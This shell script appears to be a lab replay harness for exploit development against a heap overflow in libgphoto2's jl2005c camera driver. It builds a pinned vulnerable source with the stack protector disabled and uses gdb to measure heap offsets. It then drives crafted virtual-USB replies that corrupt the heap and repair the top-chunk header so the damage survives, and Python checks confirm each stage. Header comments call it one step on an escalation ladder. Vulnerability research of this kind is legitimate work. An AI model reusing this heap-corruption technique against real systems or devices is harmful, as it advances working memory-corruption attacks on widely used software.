#!/bin/sh
# W197: on a GCC -O2 -fno-stack-protector build the jl2005c_init frame has no
# spilled priv pointer, so the :154 heap write's reply offsets 0x3E30/0x3E38
# can repair the top chunk with a device-constant pointer (0) and a
# build-constant size. The real gp_camera_folder_list_files consumer then
# lists 1022 entries. Mode s (no repair) still aborts in the first consumer
# allocation. file_get hangs on the zero-length table entry after listing
# (W195), so successful runs end at the replay's timeout; LIST is the check.
# LAB-ONLY: no wire, physical USB, command or witness; not rung 5. The top
# size is a build constant, not a device-observable value.
set -eu
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
S=${S:-/tmp/w193-lgp-base/src/libgphoto2-2.5.34}
B=${B:-/tmp/w197-o2}
P=$B/installdir
PROBE=$B/consumer-probe
OUT=${OUT:-$T/evidence/w197-gcc-o2-device-only.out}
TOP=${TOP:-0x12bd1}
VULN_SHA=0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185

[ -d "$S" ] || { echo "missing pinned source tree: $S" >&2; exit 2; }
[ "$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)" = "$VULN_SHA" ] || {
	echo "vulnerable jl2005c.c sha mismatch" >&2; exit 2; }
grep -q M2SHELL_W195_PRIV "$S/libgphoto2_port/vusb/vusb.c" || {
	echo "vusb lab patch missing" >&2; exit 2; }
command -v gdb >/dev/null && command -v setarch >/dev/null || {
	echo "gdb and setarch required" >&2; exit 2; }
mkdir -p "$B" "$(dirname "$OUT")"
if [ ! -f "$P/lib/libgphoto2/2.5.34/jl2005c.so" ]; then
	cd "$B"
	"$S/configure" --prefix="$P" --with-camlibs=jl2005c --enable-shared \
		--disable-static --without-libxml-2.0 --without-libcurl \
		--without-gdlib --without-libtiff-4 --without-libexif \
		--disable-nls --enable-vusb \
		CFLAGS='-O2 -g -fPIC -fno-omit-frame-pointer -fno-stack-protector' \
		> "$B/configure.log" 2>&1
	make -j4 > "$B/make.log" 2>&1
	make install > "$B/install.log" 2>&1
fi
if [ ! -x "$PROBE" ]; then
	gcc -O2 -g -fno-omit-frame-pointer -I"$P/include" -I"$T/pins" \
		$(pkg-config --cflags glib-2.0) \
		"$T/evidence/replay-file-consumer-probe.c" -o "$PROBE" \
		-L"$P/lib" -lgphoto2 -lgphoto2_port $(pkg-config --libs glib-2.0)
fi
exec >"$OUT" 2>&1
COMMON="CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib"

echo "== W197 GCC -O2 no-canary device-only top-header repair =="
echo "source=$S sha=$VULN_SHA"
echo "CFLAGS=-O2 -g -fPIC -fno-omit-frame-pointer -fno-stack-protector"
echo "TOP=$TOP (build constant measured by gdb, not device observable)"

echo "== gdb map at jl2005c.c:155, safe count, ASLR off =="
# shellcheck disable=SC2086
( timeout 30 gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
	-ex 'set breakpoint pending on' -ex 'set disable-randomization on' \
	-ex 'break jl2005c.c:155' -ex 'run' -ex 'p/x priv' \
	-ex 'x/2gx (char*)priv+0x4040' -ex 'find /g $rsp, $rbp+0x200, priv' \
	-ex 'kill' --args env $COMMON M2SHELL_JL2005_VUSB=s \
	M2SHELL_JL2005_COUNT=100 "$PROBE" usb:001,001 "$B/out.bin" ) \
	> "$B/gdb-map.out" 2>&1
cat "$B/gdb-map.out"

run() {
	label=$1; aslr=$2; shift 2
	set +e
	if [ "$aslr" = off ]; then
		# shellcheck disable=SC2086
		timeout 10 env $COMMON "$@" setarch -R "$PROBE" usb:001,001 \
			"$B/$label.bin" >"$B/$label.out" 2>&1
	else
		# shellcheck disable=SC2086
		timeout 10 env $COMMON "$@" "$PROBE" usb:001,001 \
			"$B/$label.bin" >"$B/$label.out" 2>&1
	fi
	rc=$?
	set -e
	echo "=== $label aslr=$aslr rc=$rc ==="
	cat "$B/$label.out"
}

echo "== device-only: full table write, no pointer/header repair =="
run DEVICE_ONLY off M2SHELL_JL2005_VUSB=s M2SHELL_JL2005_COUNT=1022
echo "== device-constant pointer + build-constant top size =="
run REPAIR off M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_W195_PRIV=0 M2SHELL_W195_TOP="$TOP"
echo "== same repair with ASLR on =="
run REPAIR_ASLR on M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_W195_PRIV=0 M2SHELL_W195_TOP="$TOP"
echo "== wrong top size =="
run WRONG_TOP off M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_W195_PRIV=0 M2SHELL_W195_TOP=0
echo "== safe count =="
run SAFE off M2SHELL_JL2005_VUSB=s M2SHELL_JL2005_COUNT=100

python3 - "$B" <<'PY'
import os, sys
b = sys.argv[1]
def text(n):
    try:
        return open(os.path.join(b, n + ".out"), encoding="utf-8", errors="replace").read()
    except OSError:
        return ""
checks = [
    ("gdb maps top size 0x12bd1", "0x0000000000012bd1" in text("gdb-map")),
    ("gdb finds no spilled priv on the frame", "Pattern not found." in text("gdb-map")),
    ("device-only init survives", "AFTER_INIT rc=0" in text("DEVICE_ONLY")),
    ("device-only first consumer allocation aborts",
     "malloc(): corrupted top size" in text("DEVICE_ONLY")),
    ("device-only no consumer listing", "LIST rc=0" not in text("DEVICE_ONLY")),
    ("device-constant repair lists 1022 entries",
     "LIST rc=0 count=1022" in text("REPAIR")),
    ("repair has no heap abort", "malloc" not in text("REPAIR")),
    ("repair survives ASLR on", "LIST rc=0 count=1022" in text("REPAIR_ASLR")),
    ("wrong top size aborts in sysmalloc", "sysmalloc" in text("WRONG_TOP")),
    ("wrong top size no consumer listing", "LIST rc=0" not in text("WRONG_TOP")),
    ("safe count lists 100 entries", "LIST rc=0 count=100" in text("SAFE")),
    ("safe count has no heap abort", "malloc" not in text("SAFE")),
]
for name, ok in checks:
    print(("PASS " if ok else "FAIL ") + name)
p = sum(ok for _, ok in checks)
print("RESULT: %d PASS / %d FAIL" % (p, len(checks) - p))
raise SystemExit(0 if p == len(checks) else 1)
PY
# End W197 replay.
